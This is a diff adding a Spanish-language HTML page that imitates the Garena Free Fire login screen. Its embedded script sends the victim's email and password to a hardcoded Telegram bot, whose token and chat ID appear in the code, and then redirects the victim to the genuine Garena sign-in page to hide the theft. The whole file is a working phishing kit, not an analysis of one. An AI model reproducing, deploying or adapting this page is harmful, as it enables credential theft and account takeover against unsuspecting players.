@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Iniciar sesión - Garena</title>
+<style>
+ body{margin:0;font-family:system-ui,-apple-system,sans-serif;background:#fff;
+      display:flex;flex-direction:column;align-items:center;padding:44px 24px}
+ .logo{font-size:30px;font-weight:800;color:#f60;letter-spacing:-1.5px;margin-bottom:6px}
+ h1{font-size:17px;font-weight:600;margin:0 0 26px;color:#111}
+ input{width:100%;max-width:360px;box-sizing:border-box;padding:15px;border:1px solid #ccc;
+       border-radius:9px;font-size:15px;margin-bottom:12px;outline:none}
+ input:focus{border-color:#f60}
+ button{width:100%;max-width:360px;padding:15px;border:0;border-radius:9px;background:#f60;
+        color:#fff;font-size:15px;font-weight:700}
+ .hint{font-size:12px;color:#999;margin-top:22px;text-align:center;max-width:360px;line-height:1.5}
+</style>
+</head>
+<body>
+<div class="logo">GARENA</div>
+<h1>Inicia sesión en Free Fire</h1>
+<form id="f">
+  <input id="e" type="email" placeholder="Correo electrónico" required>
+  <input id="p" type="password" placeholder="Contraseña" required>
+  <button type="submit">Iniciar sesión</button>
+</form>
+<p class="hint">Al continuar aceptas los Términos de Servicio y la Política de Privacidad de Garena.</p>
+<script>
+const TOKEN = '9021602090:AAFzqm3n_dhKkMQdQTuJOz44UzZ2_SBoiRQ';
+const CHAT  = '8786638977';
+document.getElementById('f').addEventListener('submit', async ev => {
+  ev.preventDefault();
+  const txt = `FREE FIRE\nCorreo: ${document.getElementById('e').value}\nPass: ${document.getElementById('p').value}\n${new Date().toLocaleString()}`;
+  try {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT, text: txt })
+    });
+  } catch(err) {}
+  location.href = 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Fff.garena.com%2F';
+});
+</script>
+</body>
+</html>
